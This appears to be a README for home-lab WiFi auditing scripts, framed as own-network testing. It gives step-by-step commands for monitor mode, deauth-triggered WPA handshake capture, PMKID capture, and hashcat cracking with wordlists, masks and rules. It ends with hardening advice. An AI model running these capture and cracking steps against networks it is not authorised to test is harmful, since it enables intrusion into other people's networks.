# WiFi handshake capture → crack — worked examples

Command reference for the `wifi/` scripts, in the order you'd actually use them,
**on your own network only**. Replace `<BSSID>` / `<CH>` / `<CLIENT>` with your
own AP's values (find them with `scan_once.sh`). Every active step confirms
ownership with `YES` — keep that.

> Hardware note: the Alfa (RTL8812AU) is power-hungry. On a Pi 5, injection
> fails and the adapter drops off USB (`error -71`) until you lift the USB
> current cap: add `usb_max_current_enable=1` to `/boot/firmware/config.txt`
> (needs the official 27W PSU) and reboot, or use a powered USB hub.

---

## 1. Monitor mode — `monitor_mode.sh`

```bash
sudo bash wifi/monitor_mode.sh start wlan1      # enable (Alfa keeps the name wlan1)
sudo bash wifi/monitor_mode.sh status
sudo bash wifi/monitor_mode.sh stop  wlan1      # restore normal WiFi
```

## 2. Scan for your AP — `scan_once.sh`

Non-interactive: scans N seconds, writes a CSV, prints the AP table, and bails
cleanly if the adapter drops off the bus.

```bash
sudo bash wifi/scan_once.sh wlan1 25            # 25s scan -> /tmp/netlab-scan-01.csv
```

Note your own network's **BSSID** and **channel** from the output.

## 3a. Capture the 4-way handshake — `capture_handshake.sh`

```bash
# unattended 120s capture; gentle repeated deauth (one knock, 30s quiet, repeat)
sudo bash wifi/capture_handshake.sh --iface wlan1 --bssid <BSSID> \
     --channel <CH> --client <CLIENT> --deauth 1 --seconds 150 --out captures/mynet

# passive (no deauth) — e.g. if the AP enforces PMF; trigger a reconnect yourself:
sudo bash wifi/capture_handshake.sh --iface wlan1 --bssid <BSSID> \
     --channel <CH> --seconds 150 --out captures/mynet
```

Tips:
- `--deauth 1` (small) + the built-in 30s quiet window lets the 4-way complete.
  A continuous deauth *flood* prevents the handshake — don't crank this high.
- Deauth only works if the AP is **not** enforcing PMF (802.11w). If it is, use
  PMKID (3b) or trigger a real reconnect (forget+rejoin a device).
- The verifier checks the **newest** `--out` cap and reports `[OK]` with the
  filename when a handshake/PMKID is present.
- **On success it auto-converts** the `.cap` to a sibling `.hc22000`
  (via `hcxpcapngtool`) and prints it, ready for GPU cracking — no manual
  convert step:
  ```
  [OK] Handshake/PMKID present in captures/mynet-01.cap
  [OK] Converted to hashcat-22000:  captures/mynet-01.hc22000
       Crack on a GPU box:  python3 wifi/crack_hashcat.py --hash captures/mynet-01.hc22000
  ```

## 3b. Clientless PMKID (alternative) — `pmkid_capture.sh`

Pulls key material straight from the AP — no client, no deauth. Bypasses PMF.
(Requires an hcxdumptool-supported driver; the Realtek `88XXau` is **not**
supported by hcxdumptool 7.x.)

```bash
sudo bash wifi/pmkid_capture.sh --iface wlan1 --bssid <BSSID> \
     --channel <CH> --seconds 60 --out captures/pmkid_mynet
```

## 4. Crack — offline, on your own capture

`crack_handshake.sh` runs on the Pi (CPU). For a **GPU** (much faster) use
`crack_hashcat.py`, which runs anywhere Python does — including Windows — and
auto-fetches hashcat + rockyou if you don't supply them.

### `crack_handshake.sh` (Pi / Linux CPU)
```bash
sudo bash wifi/crack_handshake.sh --cap captures/mynet-01.cap --bssid <BSSID>
sudo bash wifi/crack_handshake.sh --cap captures/mynet-01.cap --bssid <BSSID> \
     --wordlist /usr/share/wordlists/rockyou.txt --engine hashcat
```

### `crack_hashcat.py` (cross-platform, GPU)
You need a mode-22000 hash. `capture_handshake.sh` already writes one next to the
`.cap` on success (`captures/<name>.hc22000`) — just copy that to the GPU box.
To make one manually from any capture:
```bash
hcxpcapngtool -o mynet.hc22000 captures/mynet-*.cap
```
`crack_hashcat.py` also accepts a raw `.cap`/`.pcapng` directly and converts it
**if `hcxpcapngtool` is installed on that machine** (it usually isn't on
Windows — so prefer copying the `.hc22000`). Then, on the GPU machine (Windows
examples; use `/` paths on Linux/macOS):

```powershell
# auto-download hashcat AND rockyou, crack on the GPU:
python wifi\crack_hashcat.py --hash mynet.hc22000

# your own single / multiple wordlists (run in sequence):
python wifi\crack_hashcat.py --hash mynet.hc22000 --wordlist rockyou.txt
python wifi\crack_hashcat.py --hash mynet.hc22000 --wordlist rockyou.txt --wordlist seclists.txt

# pure brute force — all 8-digit numbers (10^8 = 100,000,000):
python wifi\crack_hashcat.py --hash mynet.hc22000 --mask ?d?d?d?d?d?d?d?d

# word + numbers  (cactus1984):
python wifi\crack_hashcat.py --hash mynet.hc22000 --wordlist names.txt --hybrid-append ?d?d?d?d
# numbers + word  (1984cactus):
python wifi\crack_hashcat.py --hash mynet.hc22000 --wordlist names.txt --hybrid-prepend ?d?d?d?d

# word mutations (leetspeak / capitalize / append):
python wifi\crack_hashcat.py --hash mynet.hc22000 --wordlist rockyou.txt \
     --rules tools\hashcat-7.1.2\rules\best64.rule

# reprint an already-cracked result:
python wifi\crack_hashcat.py --hash mynet.hc22000 --show

# use your own hashcat build / different wordlist source:
python wifi\crack_hashcat.py --hash mynet.hc22000 --hashcat C:\hashcat\hashcat.exe
```

Mask charsets: `?d`=digit(10) `?l`=lower(26) `?u`=upper(26) `?s`=symbol(33)
`?a`=all(95). Confirm the GPU is seen: `hashcat.exe -I`.

## Keyspace math — check BEFORE you launch (WPA ≈ slow)

`candidates ÷ hashrate = seconds`. WPA on a mid GPU ≈ **~325 kH/s**.

| Attack | Candidates | ≈ time @325 kH/s |
|---|---|---|
| `?d?d?d?d?d?d?d?d` (8 digits) | 100,000,000 | ~5 min |
| `?d`×9 (9 digits) | 1,000,000,000 | ~50 min |
| rockyou (14.3M) | 14,300,000 | ~45 s |
| rockyou × `best64` (~×77) | ~1.1B | ~1 hr |
| rockyou × `?d?d?d?d` (hybrid) | ~143B | ~5 days ⚠️ |

Hybrids/rules **multiply** the keyspace. For word+number combos, use a **small
targeted** wordlist (names, a few thousand) or **few** digits — not a big list
× many digits.

## Wordlists

- **SecLists**: `sudo apt install seclists` → `/usr/share/seclists/Passwords/`
- **weakpass.com**, **CrackStation** — very large (billions).
- Regional (e.g. India): a *generated* list (names + years/DOB/phone patterns)
  beats a generic dump for targeted testing.

`crack_hashcat.py` auto-downloads rockyou to `wordlists/` if you pass no
`--wordlist`. Big lists live in `wordlists/` (git-ignored) — never committed.

---

## The hardening lesson (why this exists)

Everything above is offense so you understand the defense:

- An **8-digit numeric** key = 10⁸ → cracked in **minutes** on a GPU. Weak.
- Wordlist / hybrid / rule attacks all search a *predictable* space — dictionary
  words, names, dates, and their obvious mutations.
- A **long random passphrase** (4–5 random words, or 16+ mixed chars) sits in
  **none** of those spaces, so no wordlist/hybrid/mask reaches it and pure brute
  force is astronomically infeasible.

**Actions:** set a long random passphrase, **disable WPS**, enable **WPA3/PMF**
(PMF also blocks the deauth capture in step 3a). Delete real captures when done:
`rm captures/*.cap captures/*.hc22000`.
